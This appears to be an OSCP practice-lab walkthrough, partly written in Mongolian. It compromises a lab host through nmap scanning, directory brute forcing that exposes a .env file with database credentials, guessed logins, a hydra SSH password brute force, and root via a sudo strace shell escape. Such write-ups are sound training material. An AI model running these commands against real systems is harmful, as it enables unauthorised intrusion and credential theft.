# OSCP Standalone - 1

## Nmap

```bash
nmap -A -T4 192.168.110.110 -v -p-
```

## Web Port 80

Result: found `.env` file with database credentials.

```bash
feroxbuster -u http://192.168.110.110 -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --scan-dir-listings
```

### .env Contents

```
APP_NAME=Local
APP_ENV=local
APP_KEY=base64:yN/2x7bTc/KG/T0BZvL8s1W4N4+Y87PXRvJm8iPWzE=
APP_DEBUG=true
APP_URL=http://localhost

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=creds
DB_USERNAME=root
DB_PASSWORD=Strong.DB?Password

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
```

## Shell as ftp

Some guessy moment with **anonymous:anonymous, ftp:ftp**

```bash
ssh ftp@192.168.110.110
```

Stack in apparmor.d access denied displayed "Access denied for user"

Too many rabbit holes. /etc/shadow файлын агуулга байж болно гэж бодоод crack хийж үзсэн бас л болоогүй.

Эцэст нь /home directory дотор байгаа хэрэглэгчийн нэрийг мэдэж байгаа учир bruteforce хийгээд үзье гэж бодсон.

**Login credentials:** `lisa:peanut`

```bash
hydra -l lisa -P /usr/share/wordlists/rockyou.txt ssh://192.168.110.110 -V
```

## Shell as lisa

su эрхээр ftp хэрэглэгчээс дамжиж lisa руу орсон.

### sudo shell escape

```bash
sudo -l
```

GTFOBins: https://gtfobins.org/gtfobins/strace/#shell

## Shell as root

```bash
sudo strace -o /dev/null /bin/sh
```
